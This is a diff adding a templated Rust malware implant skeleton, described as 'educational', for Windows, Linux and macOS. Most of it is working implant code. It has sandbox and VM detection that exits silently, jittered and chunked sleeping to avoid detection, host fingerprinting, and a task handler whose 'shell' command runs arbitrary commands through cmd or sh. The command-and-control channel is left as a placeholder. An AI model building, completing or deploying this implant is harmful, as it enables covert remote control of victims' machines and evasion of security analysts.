@@ -1,0 +1,283 @@
+{{!-- @desc Rust implant skeleton — basic structure for educational/research purposes --}}
+{{!-- @lang rust --}}
+{{!-- @arch x86,x64,arm64 --}}
+{{!-- @os windows,linux,macos --}}
+// @desc Rust implant skeleton — basic structure for educational/research purposes
+//!
+//! Implant Structure Template
+//! =========================
+//! Language:  Rust
+//! Platform:  {{target_os}} {{target_arch}}
+//! Purpose:   Educational skeleton showing implant architecture patterns
+//! Evasion:   {{#ifEvasionLevel 2}}{{#ifEvasionLevel 3}}Advanced{{else}}Intermediate{{/ifEvasionLevel}} techniques{{else}}Basic{{/ifEvasionLevel}}
+//!
+//! Build:
+{{#ifOS "windows"}}
+//!   cargo build --release --target {{#ifArch "x86"}}i686-pc-windows-gnu{{else}}{{#ifArch "arm64"}}aarch64-pc-windows-msvc{{else}}x86_64-pc-windows-gnu{{/ifArch}}{{/ifArch}}
+{{else}}{{#ifOS "linux"}}
+//!   cargo build --release --target {{#ifArch "x86"}}i686-unknown-linux-gnu{{else}}{{#ifArch "arm64"}}aarch64-unknown-linux-gnu{{else}}x86_64-unknown-linux-gnu{{/ifArch}}{{/ifArch}}
+{{else}}
+//!   cargo build --release --target {{#ifArch "arm64"}}aarch64-apple-darwin{{else}}x86_64-apple-darwin{{/ifArch}}
+{{/ifOS}}{{/ifOS}}
+
+use std::process::Command;
+use std::thread;
+use std::time::Duration;
+use rand::Rng;
+{{#ifEvasionLevel 2}}
+use std::collections::HashMap;
+use std::env;
+{{/ifEvasionLevel}}
+{{#ifEvasionLevel 3}}
+use std::fs;
+use std::path::Path;
+{{/ifEvasionLevel}}
+
+// === CONFIGURATION ===
+const BASE_SLEEP_MS: u64 = {{#ifEvasionLevel 3}}{{randomSleep}}{{else}}5000{{/ifEvasionLevel}};
+const JITTER_PERCENT: u64 = {{#ifEvasionLevel 2}}{{#ifEvasionLevel 3}}50{{else}}25{{/ifEvasionLevel}}{{else}}25{{/ifEvasionLevel}};
+{{#ifEvasionLevel 2}}
+const MAX_RETRIES: u32 = 3;
+const USER_AGENT: &str = "{{randomVar}}";
+{{/ifEvasionLevel}}
+
+// === CORE STRUCTURES ===
+#[derive(Debug)]
+struct Task {
+    id: String,
+    command: String,
+    args: Vec<String>,
+}
+
+struct ImplantConfig {
+    sleep_interval: u64,
+    jitter: u64,
+    {{#ifEvasionLevel 2}}
+    stealth_mode: bool,
+    process_name: String,
+    {{/ifEvasionLevel}}
+}
+
+impl ImplantConfig {
+    fn new() -> Self {
+        Self {
+            sleep_interval: BASE_SLEEP_MS,
+            jitter: JITTER_PERCENT,
+            {{#ifEvasionLevel 2}}
+            stealth_mode: true,
+            process_name: "{{randomVar}}".to_string(),
+            {{/ifEvasionLevel}}
+        }
+    }
+
+    fn calculate_sleep(&self) -> u64 {
+        let mut rng = rand::thread_rng();
+        let jitter_range = (self.sleep_interval * self.jitter) / 100;
+        let min_sleep = self.sleep_interval - jitter_range;
+        let max_sleep = self.sleep_interval + jitter_range;
+        rng.gen_range(min_sleep..=max_sleep)
+    }
+}
+
+{{#ifEvasionLevel 2}}
+// === EVASION FUNCTIONS ===
+fn check_sandbox() -> bool {
+    // Basic sandbox detection
+    let suspicious_processes = vec!["wireshark", "procmon", "vmware", "vbox", "sandbox"];
+
+    if let Ok(output) = Command::new("tasklist").output() {
+        let process_list = String::from_utf8_lossy(&output.stdout).to_lowercase();
+        for proc in suspicious_processes {
+            if process_list.contains(proc) {
+                return true;
+            }
+        }
+    }
+
+    // Check VM artifacts
+    {{#ifOS "windows"}}
+    let vm_artifacts = vec![
+        "C:\\windows\\system32\\drivers\\vmmouse.sys",
+        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
+        "C:\\windows\\system32\\drivers\\VBoxMouse.sys"
+    ];
+    {{else}}
+    let vm_artifacts = vec![
+        "/usr/bin/vmware-toolbox",
+        "/usr/bin/VBoxService",
+        "/proc/scsi/scsi"
+    ];
+    {{/ifOS}}
+
+    {{#ifEvasionLevel 3}}
+    for artifact in vm_artifacts {
+        if Path::new(artifact).exists() {
+            return true;
+        }
+    }
+    {{/ifEvasionLevel}}
+
+    false
+}
+
+fn get_system_fingerprint() -> HashMap<String, String> {
+    let mut fingerprint = HashMap::new();
+
+    // Collect system information
+    if let Ok(output) = execute_command("hostname", &[]) {
+        fingerprint.insert("hostname".to_string(), output);
+    }
+
+    if let Ok(output) = execute_command("whoami", &[]) {
+        fingerprint.insert("user".to_string(), output);
+    }
+
+    {{#ifOS "windows"}}
+    if let Ok(output) = Command::new("wmic").args(&["computersystem", "get", "model"]).output() {
+        fingerprint.insert("model".to_string(), String::from_utf8_lossy(&output.stdout).to_string());
+    }
+    {{else}}
+    if let Ok(output) = Command::new("uname").args(&["-m"]).output() {
+        fingerprint.insert("arch".to_string(), String::from_utf8_lossy(&output.stdout).to_string());
+    }
+    {{/ifOS}}
+
+    fingerprint
+}
+{{/ifEvasionLevel}}
+
+// === COMMAND EXECUTION ===
+fn execute_command(cmd: &str, args: &[String]) -> Result<String, String> {
+    {{#ifEvasionLevel 2}}
+    // Add random delay before execution
+    let mut rng = rand::thread_rng();
+    let delay = rng.gen_range(100..500);
+    thread::sleep(Duration::from_millis(delay));
+    {{/ifEvasionLevel}}
+
+    match Command::new(cmd).args(args).output() {
+        Ok(output) => {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let stderr = String::from_utf8_lossy(&output.stderr);
+            if output.status.success() {
+                Ok(stdout.to_string())
+            } else {
+                Err(stderr.to_string())
+            }
+        },
+        Err(e) => Err(format!("Command failed: {}", e)),
+    }
+}
+
+fn process_task(task: Task) -> String {
+    match task.command.as_str() {
+        "whoami" => execute_command("whoami", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
+        {{#ifOS "windows"}}
+        "pwd" => execute_command("cd", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
+        "ls" => execute_command("dir", &task.args).unwrap_or_else(|e| format!("Error: {}", e)),
+        {{else}}
+        "pwd" => execute_command("pwd", &[]).unwrap_or_else(|e| format!("Error: {}", e)),
+        "ls" => execute_command("ls", &task.args).unwrap_or_else(|e| format!("Error: {}", e)),
+        {{/ifOS}}
+        "shell" if !task.args.is_empty() => {
+            let shell_cmd = task.args.join(" ");
+            {{#ifOS "windows"}}
+            execute_command("cmd", &["/c".to_string(), shell_cmd])
+            {{else}}
+            execute_command("sh", &["-c".to_string(), shell_cmd])
+            {{/ifOS}}
+                .unwrap_or_else(|e| format!("Error: {}", e))
+        },
+        {{#ifEvasionLevel 2}}
+        "sysinfo" => get_system_info(),
+        "fingerprint" => {
+            let fp = get_system_fingerprint();
+            format!("{:#?}", fp)
+        },
+        {{/ifEvasionLevel}}
+        _ => "Unknown command".to_string(),
+    }
+}
+
+// === MAIN LOOP ===
+fn main() {
+    {{#ifEvasionLevel 2}}
+    // Sandbox detection
+    if check_sandbox() {
+        // Exit silently if sandbox detected
+        std::process::exit(0);
+    }
+    {{/ifEvasionLevel}}
+
+    let config = ImplantConfig::new();
+
+    {{#ifEvasionLevel 3}}
+    // Advanced persistence check
+    let current_exe = env::current_exe().unwrap_or_default();
+    if let Some(file_name) = current_exe.file_name() {
+        if file_name != "{{randomVar}}.exe" && file_name != "{{randomVar}}" {
+            // Rename or relocate if name doesn't match expected
+        }
+    }
+    {{/ifEvasionLevel}}
+
+    // Basic implant loop structure
+    loop {
+        // TODO: Replace with actual comms implementation
+        // This is just a skeleton showing the structure
+
+        let sleep_duration = config.calculate_sleep();
+
+        {{#ifEvasionLevel 2}}
+        // Stealth checks during sleep
+        if config.stealth_mode {
+            // Sleep in smaller chunks to avoid detection
+            let chunk_size = sleep_duration / 10;
+            for _ in 0..10 {
+                thread::sleep(Duration::from_millis(chunk_size));
+
+                // Periodic sandbox re-check
+                if check_sandbox() {
+                    std::process::exit(0);
+                }
+            }
+        } else {
+            thread::sleep(Duration::from_millis(sleep_duration));
+        }
+        {{else}}
+        thread::sleep(Duration::from_millis(sleep_duration));
+        {{/ifEvasionLevel}}
+
+        // Placeholder for task retrieval
+        // In real implementation, this would fetch from C2
+
+        {{#ifEvasionLevel 3}}
+        // Placeholder for self-update check
+        // Check if newer version is available
+        {{/ifEvasionLevel}}
+
+        break; // Exit for template - real implant would continue
+    }
+}
+
+// === HELPER FUNCTIONS ===
+fn get_system_info() -> String {
+    {{#ifOS "windows"}}
+    let hostname = execute_command("hostname", &[]).unwrap_or("unknown".to_string());
+    let user = execute_command("whoami", &[]).unwrap_or("unknown".to_string());
+    {{else}}
+    let hostname = execute_command("hostname", &[]).unwrap_or("unknown".to_string());
+    let user = execute_command("whoami", &[]).unwrap_or("unknown".to_string());
+    {{/ifOS}}
+    format!("Host: {} | User: {}", hostname.trim(), user.trim())
+}
+
+{{#ifOS "windows"}}
+fn get_os_info() -> String {
+    execute_command("systeminfo", &[]).unwrap_or("Windows (details unavailable)".to_string())
+}
+{{else}}
+fn get_os_info() -> String {
+    execute_command("uname", &["-a".to_string()]).unwrap_or("Unix-like (details unavailable)".to_string())
+}
+{{/ifOS}}
